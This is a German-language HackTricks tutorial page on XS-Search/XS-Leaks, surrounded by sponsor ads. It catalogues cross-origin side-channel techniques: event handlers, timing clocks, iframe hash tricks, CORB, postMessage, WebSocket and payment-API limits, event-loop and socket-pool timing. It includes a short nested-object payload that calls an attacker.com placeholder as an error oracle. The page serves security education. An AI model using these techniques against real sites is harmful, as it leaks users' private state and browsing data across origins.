# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Grundinformationen

XS-Search ist eine Methode zur **Extraktion von Informationen √ºber verschiedene Urspr√ºnge** durch Ausnutzung von **Nebenkanalanf√§lligkeiten**.

Wichtige Komponenten, die an diesem Angriff beteiligt sind:

* **Anf√§llige Webseite**: Die Zielwebsite, von der Informationen extrahiert werden sollen.
* **Angreifer-Webseite**: Die b√∂sartige Webseite, die vom Angreifer erstellt wurde und die der Opfer besucht, um den Exploit zu hosten.
* **Einbeziehungsmethode**: Die Technik, die verwendet wird, um die anf√§llige Webseite in die Angreifer-Webseite einzubeziehen (z. B. window.open, iframe, fetch, HTML-Tag mit href usw.).
* **Leak-Technik**: Techniken, die verwendet werden, um Unterschiede im Zustand der anf√§lligen Webseite basierend auf Informationen zu erkennen, die durch die Einbeziehungsmethode gesammelt wurden.
* **Zust√§nde**: Die beiden potenziellen Bedingungen der anf√§lligen Webseite, die der Angreifer zu unterscheiden versucht.
* **Erkennbare Unterschiede**: Beobachtbare Variationen, auf die der Angreifer sich verl√§sst, um den Zustand der anf√§lligen Webseite abzuleiten.

### Erkennbare Unterschiede

Mehrere Aspekte k√∂nnen analysiert werden, um die Zust√§nde der anf√§lligen Webseite zu unterscheiden:

* **Statuscode**: Unterscheidung zwischen **verschiedenen HTTP-Antwortstatuscodes** √ºber Urspr√ºnge hinweg, wie Serverfehler, Clientfehler oder Authentifizierungsfehler.
* **API-Nutzung**: Identifizierung der **Nutzung von Web-APIs** √ºber Seiten hinweg, die zeigt, ob eine Cross-Origin-Seite eine bestimmte JavaScript-Web-API verwendet.
* **Weiterleitungen**: Erkennung von Navigationen zu anderen Seiten, nicht nur HTTP-Weiterleitungen, sondern auch solche, die durch JavaScript oder HTML ausgel√∂st werden.
* **Seiteninhalt**: Beobachtung von **Variationen im HTTP-Antwortk√∂rper** oder in Seitenunterressourcen, wie der **Anzahl der eingebetteten Frames** oder Gr√∂√üenunterschieden bei Bildern.
* **HTTP-Header**: Feststellung der Anwesenheit oder m√∂glicherweise des Wertes eines **bestimmten HTTP-Antwortheaders**, einschlie√ülich Header wie X-Frame-Options, Content-Disposition und Cross-Origin-Resource-Policy.
* **Timing**: Feststellung konsistenter Zeitunterschiede zwischen den beiden Zust√§nden.

### Einbeziehungsmethoden

* **HTML-Elemente**: HTML bietet verschiedene Elemente zur **Einbeziehung von Ressourcen √ºber verschiedene Urspr√ºnge**, wie Stylesheets, Bilder oder Skripte, die den Browser zwingen, eine Nicht-HTML-Ressource anzufordern. Eine Zusammenstellung potenzieller HTML-Elemente f√ºr diesen Zweck finden Sie unter [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Frames**: Elemente wie **iframe**, **object** und **embed** k√∂nnen HTML-Ressourcen direkt in die Seite des Angreifers einbetten. Wenn die Seite **keinen Schutz vor Einbettung** hat, kann JavaScript auf das Fensterobjekt der eingebetteten Ressource √ºber die Eigenschaft contentWindow zugreifen.
* **Pop-ups**: Die **`window.open`**-Methode √∂ffnet eine Ressource in einem neuen Tab oder Fenster und bietet einen **Fenster-Handle**, mit dem JavaScript mit Methoden und Eigenschaften gem√§√ü dem SOP interagieren kann. Pop-ups, die h√§ufig bei der einmaligen Anmeldung verwendet werden, umgehen die Einbettungs- und Cookie-Beschr√§nkungen einer Zielressource. Moderne Browser schr√§nken jedoch die Erstellung von Pop-ups auf bestimmte Benutzeraktionen ein.
* **JavaScript-Anfragen**: JavaScript erlaubt direkte Anfragen an Zielressourcen unter Verwendung von **XMLHttpRequests** oder der **Fetch API**. Diese Methoden bieten eine pr√§zise Kontrolle √ºber die Anfrage, z. B. die Entscheidung, HTTP-Weiterleitungen zu folgen.

### Leak-Techniken

* **Ereignishandler**: Eine klassische Leak-Technik in XS-Leaks, bei der Ereignishandler wie **onload** und **onerror** Einblicke in den Erfolg oder Misserfolg des Ladens von Ressourcen geben.
* **Fehlermeldungen**: JavaScript-Ausnahmen oder spezielle Fehlermeldungsseiten k√∂nnen Leak-Informationen entweder direkt aus der Fehlermeldung oder durch Unterscheidung zwischen deren Anwesenheit und Abwesenheit bereitstellen.
* **Globale Grenzen**: Physische Einschr√§nkungen eines Browsers, wie Speicherkapazit√§t oder andere durch den Browser durchgesetzte Grenzen, k√∂nnen signalisieren, wenn ein Schwellenwert erreicht ist, und dienen als Leak-Technik.
* **Globaler Zustand**: Erkennbare Interaktionen mit den **globalen Zust√§nden** der Browser (z. B. die History-Schnittstelle) k√∂nnen ausgenutzt werden. Beispielsweise kann die **Anzahl der Eintr√§ge** im Verlauf eines Browsers Hinweise auf Cross-Origin-Seiten geben.
* **Performance-API**: Diese API bietet **Leistungsdetails der aktuellen Seite**, einschlie√ülich Netzwerkzeit f√ºr das Dokument und geladene Ressourcen, und erm√∂glicht R√ºckschl√ºsse auf angeforderte Ressourcen.
* **Lesbare Attribute**: Einige HTML-Attribute sind **√ºber verschiedene Urspr√ºnge hinweg lesbar** und k√∂nnen als Leak-Technik verwendet werden. Beispielsweise erm√∂glicht die `window.frame.length`-Eigenschaft JavaScript, die in einer Webseite eingebetteten Frames √ºber verschiedene Urspr√ºnge hinweg zu z√§hlen.

## XSinator-Tool & Papier

XSinator ist ein automatisches Tool, um **Browser gegen mehrere bekannte XS-Leaks** zu √ºberpr√ºfen, die in seinem Papier erkl√§rt werden: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Sie k√∂nnen **auf das Tool zugreifen unter** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Ausgeschlossene XS-Leaks**: Wir mussten XS-Leaks ausschlie√üen, die auf **Service-Workern** basieren, da sie andere Leaks in XSinator st√∂ren w√ºrden. Dar√ºber hinaus haben wir uns entschieden, **XS-Leaks auszuschlie√üen, die auf Fehlkonfigurationen und Bugs in einer bestimmten Webanwendung basieren**. Zum Beispiel Fehlkonfigurationen bei CrossOrigin Resource Sharing (CORS), postMessage-Leaks oder Cross-Site Scripting. Au√üerdem haben wir zeitbasierte XS-Leaks ausgeschlossen, da sie oft langsam, laut und ungenau sind.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Zeitbasierte Techniken**

Einige der folgenden Techniken werden Zeit als Teil des Prozesses verwenden, um Unterschiede in den m√∂glichen Zust√§nden der Webseiten zu erkennen. Es gibt verschiedene M√∂glichkeiten, Zeit in einem Webbrowser zu messen.

**Uhren**: Die [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API erm√∂glicht Entwicklern, hochaufl√∂sende Zeitmessungen zu erhalten.\
Es gibt eine betr√§chtliche Anzahl von APIs, die Angreifer missbrauchen k√∂nnen, um implizite Uhren zu erstellen: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS-Animationen und andere.\
F√ºr weitere Informationen: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Ereignishandler-Techniken

### Onload/Onerror

* **Einbeziehungsmethoden**: Frames, HTML-Elemente
* **Erkennbare Unterschiede**: Statuscode
* **Weitere Informationen**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Zusammenfassung**: Wenn versucht wird, eine Ressource zu laden, werden onerror/onload-Ereignisse ausgel√∂st, wenn die Ressource erfolgreich/nicht erfolgreich geladen wird, sodass es m√∂glich ist, den Statuscode herauszufinden.
* **Codebeispiel**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Das Codebeispiel versucht, **Skripte von JS** zu laden, aber **andere Tags** wie Objekte, Stylesheets, Bilder, Audios k√∂nnten ebenfalls verwendet werden. Dar√ºber hinaus ist es auch m√∂glich, das **Tag direkt** einzuf√ºgen und die `onload`- und `onerror`-Ereignisse innerhalb des Tags zu deklarieren (anstatt es von JS einzuf√ºgen).

Es gibt auch eine skriptlose Version dieses Angriffs:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In diesem Fall, wenn `example.com/404` nicht gefunden wird, wird `attacker.com/?error` geladen.

### Onload Timing

* **Inclusion Methods**: HTML-Elemente
* **Detectable Difference**: Timing (generell aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** Die [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** kann verwendet werden, um zu messen, wie viel Zeit ben√∂tigt wird, um eine Anfrage auszuf√ºhren. Es k√∂nnten jedoch auch andere Uhren verwendet werden, wie die [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), die Aufgaben identifizieren kann, die l√§nger als 50 ms laufen.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) ein weiteres Beispiel in:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Diese Technik ist wie die vorherige, aber der **Angreifer** wird auch **eine Aktion erzwingen**, die eine **relevante Zeitspanne** ben√∂tigt, wenn die **Antwort positiv oder negativ** ist, und diese Zeit messen.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generell aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** Die [SharedArrayBuffer-Uhr](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) kann verwendet werden, um zu messen, wie viel Zeit ben√∂tigt wird, um eine Anfrage auszuf√ºhren. Es k√∂nnten auch andere Uhren verwendet werden.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Die Zeit, die ben√∂tigt wird, um eine Ressource abzurufen, kann gemessen werden, indem die [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) und [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) Ereignisse genutzt werden. Das **`beforeunload`** Ereignis wird ausgel√∂st, wenn der Browser dabei ist, zu einer neuen Seite zu navigieren, w√§hrend das **`unload`** Ereignis auftritt, wenn die Navigation tats√§chlich stattfindet. Der Zeitunterschied zwischen diesen beiden Ereignissen kann berechnet werden, um die **Dauer zu bestimmen, die der Browser mit dem Abrufen der Ressource verbracht hat**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generell aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** Die [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API kann verwendet werden, um zu messen, wie viel Zeit ben√∂tigt wird, um eine Anfrage auszuf√ºhren. Es k√∂nnten auch andere Uhren verwendet werden.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Es wurde beobachtet, dass in Abwesenheit von [Framing-Schutzma√ünahmen](https://xsleaks.dev/docs/defenses/opt-in/xfo/) die Zeit, die ben√∂tigt wird, um eine Seite und ihre Unterressourcen √ºber das Netzwerk zu laden, von einem Angreifer gemessen werden kann. Diese Messung ist typischerweise m√∂glich, da der `onload`-Handler eines iframes nur nach Abschluss des Ladens der Ressourcen und der Ausf√ºhrung von JavaScript ausgel√∂st wird. Um die Variabilit√§t zu umgehen, die durch die Ausf√ºhrung von Skripten eingef√ºhrt wird, k√∂nnte ein Angreifer das [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) Attribut innerhalb des `<iframe>` verwenden. Die Einbeziehung dieses Attributs schr√§nkt zahlreiche Funktionen ein, insbesondere die Ausf√ºhrung von JavaScript, wodurch eine Messung erm√∂glicht wird, die √ºberwiegend von der Netzwerkleistung beeinflusst wird.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Seiteninhalt
* **More info**:
* **Summary**: Wenn Sie die Seite dazu bringen k√∂nnen, einen Fehler anzuzeigen, wenn auf den richtigen Inhalt zugegriffen wird, und sie korrekt l√§dt, wenn auf beliebigen Inhalt zugegriffen wird, k√∂nnen Sie eine Schleife erstellen, um alle Informationen zu extrahieren, ohne die Zeit zu messen.
* **Code Example**:

Angenommen, Sie k√∂nnen die **Seite** mit dem **geheimen** Inhalt **in ein Iframe einf√ºgen**.

Sie k√∂nnen **das Opfer dazu bringen, nach** der Datei zu suchen, die "_**flag**_" enth√§lt, indem Sie ein **Iframe** verwenden (zum Beispiel durch Ausnutzung eines CSRF). Innerhalb des Iframes wissen Sie, dass das _**onload-Ereignis**_ **immer mindestens einmal** ausgef√ºhrt wird. Dann k√∂nnen Sie die **URL** des **iframes √§ndern**, indem Sie nur den **Inhalt** des **Hash** innerhalb der URL √§ndern.

Zum Beispiel:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Wenn die erste URL **erfolgreich geladen** wurde, wird das **onload**-Ereignis **nicht erneut ausgel√∂st**, wenn der **Hash**-Teil der URL ge√§ndert wird. Aber **wenn** die Seite beim **Laden** einen **Fehler** hatte, wird das **onload**-Ereignis **erneut ausgel√∂st**.

Dann k√∂nnen Sie **unterscheiden zwischen** einer **korrekt** geladenen Seite oder einer Seite, die einen **Fehler** aufweist, wenn sie aufgerufen wird.

### Javascript-Ausf√ºhrung

* **Inclusion Methods**: Frames
* **Detectable Difference**: Seiteninhalt
* **More info**:
* **Summary:** Wenn die **Seite** den **sensiblen** Inhalt **oder** einen **Inhalt** zur√ºckgibt, der vom Benutzer **kontrolliert** werden kann. Der Benutzer k√∂nnte **g√ºltigen JS-Code im negativen Fall** festlegen, um **jeden Versuch innerhalb von** **`<script>`**-Tags zu laden, sodass im **negativen** Fall der **Code** des Angreifers **ausgef√ºhrt** wird, und in **positiven** F√§llen wird **nichts** ausgef√ºhrt.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML-Elemente
* **Detectable Difference**: Statuscode & Header
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** ist eine Sicherheitsma√ünahme, die verhindert, dass Webseiten bestimmte sensible Cross-Origin-Ressourcen laden, um sich vor Angriffen wie **Spectre** zu sch√ºtzen. Angreifer k√∂nnen jedoch das sch√ºtzende Verhalten ausnutzen. Wenn eine Antwort, die dem **CORB** unterliegt, einen _**CORB-gesch√ºtzten**_ `Content-Type` mit `nosniff` und einem `2xx`-Statuscode zur√ºckgibt, entfernt **CORB** den Body und die Header der Antwort. Angreifer, die dies beobachten, k√∂nnen die Kombination aus dem **Statuscode** (der Erfolg oder Fehler anzeigt) und dem `Content-Type` (der angibt, ob er durch **CORB** gesch√ºtzt ist) ableiten, was zu potenziellen Informationslecks f√ºhren kann.
* **Code Example**:

√úberpr√ºfen Sie den Link f√ºr weitere Informationen √ºber den Angriff.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Sensible Daten aus dem id- oder name-Attribut leaken.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es ist m√∂glich, eine **Seite** innerhalb eines **iframes** zu **laden** und die **`#id_value`** zu verwenden, um die Seite **auf das Element** des iframes mit dem angegebenen id zu fokussieren. Wenn dann ein **`onblur`**-Signal ausgel√∂st wird, existiert das ID-Element.\
Sie k√∂nnen denselben Angriff mit **`portal`**-Tags durchf√ºhren.

### postMessage-Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API-Nutzung
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Sensible Informationen aus einem postMessage sammeln oder die Anwesenheit von postMessages als Orakel verwenden, um den Status des Benutzers auf der Seite zu kennen.
* **Code Example**: `Jeder Code, der auf alle postMessages h√∂rt.`

Anwendungen nutzen h√§ufig [`postMessage`-Broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), um √ºber verschiedene Urspr√ºnge hinweg zu kommunizieren. Diese Methode kann jedoch unbeabsichtigt **sensible Informationen** offenbaren, wenn der `targetOrigin`-Parameter nicht ordnungsgem√§√ü angegeben ist, sodass jedes Fenster die Nachrichten empfangen kann. Dar√ºber hinaus kann der blo√üe Empfang einer Nachricht als **Orakel** fungieren; bestimmte Nachrichten k√∂nnten beispielsweise nur an Benutzer gesendet werden, die angemeldet sind. Daher kann das Vorhandensein oder Fehlen dieser Nachrichten Informationen √ºber den Status oder die Identit√§t des Benutzers offenbaren, z. B. ob sie authentifiziert sind oder nicht.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Globale Grenztechniken

### WebSocket-API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API-Nutzung
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Das Ersch√∂pfen des WebSocket-Verbindungslimits leakt die Anzahl der WebSocket-Verbindungen einer Cross-Origin-Seite.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Es ist m√∂glich zu identifizieren, ob und wie viele **WebSocket-Verbindungen eine Zielseite verwendet**. Dies erm√∂glicht es einem Angreifer, Anwendungszust√§nde zu erkennen und Informationen zu leaken, die mit der Anzahl der WebSocket-Verbindungen verbunden sind.

Wenn ein **Ursprung** die **maximale Anzahl von WebSocket**-Verbindungsobjekten verwendet, unabh√§ngig von ihrem Verbindungsstatus, f√ºhrt die Erstellung von **neuen Objekten zu JavaScript-Ausnahmen**. Um diesen Angriff auszuf√ºhren, √∂ffnet die Angreifer-Website die Ziel-Website in einem Pop-up oder Iframe und versucht dann, nachdem die Ziel-Webseite geladen wurde, die maximale Anzahl von WebSocket-Verbindungen zu erstellen. Die **Anzahl der ausgel√∂sten Ausnahmen** ist die **Anzahl der von der Ziel-Website verwendeten WebSocket-Verbindungen**.

### Zahlungs-API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API-Nutzung
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Zahlungsanforderung erkennen, da immer nur eine aktiv sein kann.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Dieses XS-Leak erm√∂glicht es einem Angreifer, **zu erkennen, wann eine Cross-Origin-Seite eine Zahlungsanforderung initiiert**.

Da **immer nur eine Zahlungsanforderung aktiv sein kann**, schl√§gt jeder weitere Versuch, diese API zu verwenden, fehl und verursacht eine **JavaScript-Ausnahme**. Der Angreifer kann dies ausnutzen, indem er **periodisch versucht, die Benutzeroberfl√§che der Zahlungs-API anzuzeigen**. Wenn ein Versuch eine Ausnahme verursacht, verwendet die Ziel-Website sie derzeit. Der Angreifer kann diese periodischen Versuche verbergen, indem er die Benutzeroberfl√§che sofort nach der Erstellung schlie√üt.

### Timing des Event-Loops <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (allgemein aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Messen Sie die Ausf√ºhrungszeit eines Webs, indem Sie den einheitlichen JS-Event-Loop ausnutzen.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript arbeitet mit einem [einzelnen, threadbasierten Event-Loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)-Nebenl√§ufigkeitsmodell, was bedeutet, dass **es nur eine Aufgabe gleichzeitig ausf√ºhren kann**. Diese Eigenschaft kann ausgenutzt werden, um **zu messen, wie lange Code aus einem anderen Ursprung ben√∂tigt, um ausgef√ºhrt zu werden**. Ein Angreifer kann die Ausf√ºhrungszeit seines eigenen Codes im Event-Loop messen, indem er kontinuierlich Ereignisse mit festen Eigenschaften dispatcht. Diese Ereignisse werden verarbeitet, wenn der Ereignispool leer ist. Wenn andere Urspr√ºnge ebenfalls Ereignisse an denselben Pool dispatchen, kann ein **Angreifer die Zeit ableiten, die diese externen Ereignisse ben√∂tigen, indem er Verz√∂gerungen bei der Ausf√ºhrung seiner eigenen Aufgaben beobachtet**. Diese Methode zur √úberwachung des Event-Loops auf Verz√∂gerungen kann die Ausf√ºhrungszeit von Code aus verschiedenen Urspr√ºngen offenbaren und potenziell sensible Informationen preisgeben.

{% hint style="warning" %}
Bei einer Ausf√ºhrungszeitmessung ist es m√∂glich, **Netzwerkfaktoren zu eliminieren**, um **genauere Messungen** zu erhalten. Zum Beispiel, indem Sie die Ressourcen, die von der Seite verwendet werden, vor dem Laden laden.
{% endhint %}

### Besch√§ftigter Event-Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (allgemein aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Eine Methode zur Messung der Ausf√ºhrungszeit einer Weboperation besteht darin, absichtlich den Event-Loop eines Threads zu blockieren und dann zu messen, **wie lange es dauert, bis der Event-Loop wieder verf√ºgbar ist**. Durch das Einf√ºgen einer blockierenden Operation (wie einer langen Berechnung oder einem synchronen API-Aufruf) in den Event-Loop und das √úberwachen der Zeit, die ben√∂tigt wird, damit nachfolgender Code mit der Ausf√ºhrung beginnt, kann man die Dauer der Aufgaben ableiten, die w√§hrend der Blockierungszeit im Event-Loop ausgef√ºhrt wurden. Diese Technik nutzt die einheitliche Natur des Event-Loops von JavaScript aus, bei dem Aufgaben sequenziell ausgef√ºhrt werden, und kann Einblicke in die Leistung oder das Verhalten anderer Operationen geben, die denselben Thread teilen.
* **Code Example**:

Ein wesentlicher Vorteil der Technik zur Messung der Ausf√ºhrungszeit durch Sperren des Event-Loops besteht darin, dass sie potenziell **Site Isolation** umgeht. **Site Isolation** ist eine Sicherheitsfunktion, die verschiedene Websites in separate Prozesse trennt, um zu verhindern, dass b√∂sartige Websites direkt auf sensible Daten anderer Websites zugreifen. Durch die Beeinflussung der Ausf√ºhrungszeit eines anderen Ursprungs √ºber den gemeinsamen Event-Loop kann ein Angreifer indirekt Informationen √ºber die Aktivit√§ten dieses Ursprungs extrahieren. Diese Methode beruht nicht auf dem direkten Zugriff auf die Daten des anderen Ursprungs, sondern beobachtet die Auswirkungen der Aktivit√§ten dieses Ursprungs auf den gemeinsamen Event-Loop und umgeht so die Schutzbarrieren, die durch **Site Isolation** eingerichtet wurden.

{% hint style="warning" %}
Bei einer Ausf√ºhrungszeitmessung ist es m√∂glich, **Netzwerkfaktoren zu eliminieren**, um **genauere Messungen** zu erhalten. Zum Beispiel, indem Sie die Ressourcen, die von der Seite verwendet werden, vor dem Laden laden.
{% endhint %}

### Verbindungs-Pool

* **Inclusion Methods**: JavaScript-Anfragen
* **Detectable Difference**: Timing (allgemein aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Ein Angreifer k√∂nnte alle Sockets au√üer 1 sperren, die Ziel-Webseite laden und gleichzeitig eine andere Seite laden. Die Zeit, bis die letzte Seite zu laden beginnt, ist die Zeit, die die Zielseite zum Laden ben√∂tigt hat.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Browser verwenden Sockets f√ºr die Serverkommunikation, aber aufgrund der begrenzten Ressourcen des Betriebssystems und der Hardware sind **Browser gezwungen, ein Limit** f√ºr die Anzahl der gleichzeitigen Sockets festzulegen. Angreifer k√∂nnen diese Einschr√§nkung durch die folgenden Schritte ausnutzen:

1. Bestimmen Sie das Socket-Limit des Browsers, zum Beispiel 256 globale Sockets.
2. Besetzen Sie 255 Sockets f√ºr l√§ngere Zeit, indem Sie 255 Anfragen an verschiedene Hosts initiieren, die darauf ausgelegt sind, die Verbindungen offen zu halten, ohne sie abzuschlie√üen.
3. Verwenden Sie den 256. Socket, um eine Anfrage an die Zielseite zu senden.
